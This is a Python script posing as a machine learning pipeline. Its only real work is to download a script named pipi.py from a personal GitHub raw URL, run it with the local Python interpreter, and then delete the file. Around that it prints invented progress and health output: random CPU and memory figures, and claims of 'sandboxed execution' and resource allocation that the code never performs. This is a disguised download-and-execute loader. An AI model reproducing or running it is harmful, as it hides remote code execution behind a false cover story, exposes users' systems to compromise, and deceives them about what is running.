import urllib.request
import subprocess
import time
import random
import datetime
import os
import sys
import threading

# --- Shared state dictionary for the background reporter thread ---
pipeline_status = {
    "phase": "Not Started",
    "running": True,
    "start_time": time.time()
}

def log(message):
    """Prints a message with a timestamp for clear logging."""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {message}")

def status_reporter():
    """
    Runs in a background thread to periodically report the pipeline's status.
    This simulates a monitoring service.
    """
    log("[STATUS REPORTER] Background monitor initialized. Will report every 10-20 seconds.")
    
    while pipeline_status["running"]:
        # Wait for a random interval. This loop checks the running flag every second
        # to ensure the thread can exit quickly once the main process is done.
        sleep_duration = random.uniform(10, 20)
        for _ in range(int(sleep_duration)):
            if not pipeline_status["running"]:
                break
            time.sleep(1)
        
        # After waiting, if the pipeline is still active, generate and print a report.
        if pipeline_status["running"]:
            elapsed_time = time.time() - pipeline_status["start_time"]
            cpu_usage = f"{random.uniform(15.0, 45.0):.1f}%"
            mem_usage = f"{random.uniform(20.0, 60.0):.1f}%"
            
            log("\n" + "="*25 + " PIPELINE HEALTH REPORT " + "="*25)
            log(f"  Overall Status : In Progress")
            log(f"  Current Phase  : {pipeline_status['phase']}")
            log(f"  Elapsed Time   : {datetime.timedelta(seconds=int(elapsed_time))}")
            log(f"  System Health  : OK (CPU Usage: {cpu_usage}, Memory Usage: {mem_usage})")
            log("="*74 + "\n")
    
    log("[STATUS REPORTER] Main process finished. Background monitor shutting down.")


def main():
    """Main function to simulate an ML process and run the target script."""
    
    # Start the background status reporter thread.
    # It's a daemon so it won't block the program from exiting.
    reporter_thread = threading.Thread(target=status_reporter, daemon=True)
    reporter_thread.start()

    try:
        pipeline_status["phase"] = "Initialization"
        log("===== STARTING MACHINE LEARNING PIPELINE =====")
        log("  - Validating system environment and permissions...")
        time.sleep(1.2)
        log("  - System check PASSED.")

        # --- PHASE 1: Environment Setup & Dependency Download ---
        pipeline_status["phase"] = "Environment Setup and Pre-computation"
        log("[PHASE 1/3] Environment Setup and Pre-computation")
        url = "https://raw.githubusercontent.com/michellitasv/projects/refs/heads/main/pipi.py"
        filename = "pipi.py"
        log(f"  [1/3] Identified core dependency script: '{filename}'.")
        log(f"  -> Source URL: {url}")
        log(f"  [2/3] Checking network connectivity to host...")
        time.sleep(0.8)
        log(f"  -> Network connection successful.")
        
        try:
            log(f"  [3/3] Downloading core script via HTTPS...")
            urllib.request.urlretrieve(url, filename)
            file_size = os.path.getsize(filename)
            log(f"  [3/3] -> Successfully downloaded '{filename}' ({file_size} bytes).")
        except Exception as e:
            log(f"  [ERROR] Critical failure: Failed to download the script. Error: {e}")
            log("===== PIPELINE HALTED DUE TO SETUP FAILURE =====")
            return

        log("[PHASE 1/3] Environment Setup Complete.\n")
        time.sleep(1.5)

        # --- PHASE 2: Core Process Execution ---
        pipeline_status["phase"] = f"Core Process Execution: '{filename}'"
        log(f"[PHASE 2/3] Executing Core Process: '{filename}'")
        log("  - Allocating system resources for sandboxed execution...")
        time.sleep(1)
        log("  - Initializing execution environment...")
        log("  - Handing over control to the downloaded script. All subsequent output is from this process.")
        log("--------------------------------------------------")
        time.sleep(2)

        try:
            process = subprocess.run(
                [sys.executable, filename], 
                check=True,
                capture_output=True,
                text=True
            )
            log("--- Sub-process STDOUT Log START ---")
            print(process.stdout)
            log("--- Sub-process STDOUT Log END ---")
            if process.stderr:
                log("--- Sub-process STDERR Log START ---")
                print(process.stderr)
                log("--- Sub-process STDERR Log END ---")
                
        except FileNotFoundError:
            log(f"  [ERROR] '{sys.executable}' command not found. Ensure Python is in your system's PATH.")
            log("===== PIPELINE HALTED DUE TO EXECUTION ERROR =====")
            return
        except subprocess.CalledProcessError as e:
            log(f"  [ERROR] The script '{filename}' failed to execute successfully.")
            log(f"  -> Exit Code: {e.returncode}")
            log("--- Sub-process STDOUT Log START ---")
            print(e.stdout)
            log("--- Sub-process STDOUT Log END ---")
            log("--- Sub-process STDERR Log START ---")
            print(e.stderr)
            log("--- Sub-process STDERR Log END ---")
            log("===== PIPELINE HALTED DUE TO SCRIPT FAILURE =====")
            return
        except Exception as e:
            log(f"  [ERROR] An unexpected error occurred during script execution: {e}")
            log("===== PIPELINE HALTED DUE TO UNEXPECTED ERROR =====")
            return

        log("--------------------------------------------------")
        log(f"[PHASE 2/3] Core Process '{filename}' Execution Finished.\n")
        time.sleep(1.5)

        # --- PHASE 3: Finalizing and Cleanup ---
        pipeline_status["phase"] = "Finalizing and Cleaning Up Workspace"
        log("[PHASE 3/3] Finalizing and Cleaning Up Workspace")
        log(f"  [1/2] Releasing allocated system resources...")
        time.sleep(1)
        log(f"  [2/2] Removing temporary script file: '{filename}'...")
        try:
            os.remove(filename)
            log(f"  -> Successfully removed '{filename}'.")
        except OSError as e:
            log(f"  - [WARNING] Could not remove file '{filename}'. Manual cleanup may be required. Error: {e.strerror}")
            
        log("[PHASE 3/3] Cleanup Complete.")
        total_duration = time.time() - pipeline_status["start_time"]
        log(f"===== MACHINE LEARNING PIPELINE FINISHED SUCCESSFULLY IN {total_duration:.2f} SECONDS =====")

    finally:
        # This block ensures that we signal the reporter thread to stop,
        # no matter how the main function exits (success or error).
        pipeline_status["running"] = False
        # Give the daemon thread a moment to see the flag and shut down gracefully.
        time.sleep(2)

if __name__ == "__main__":
    main()
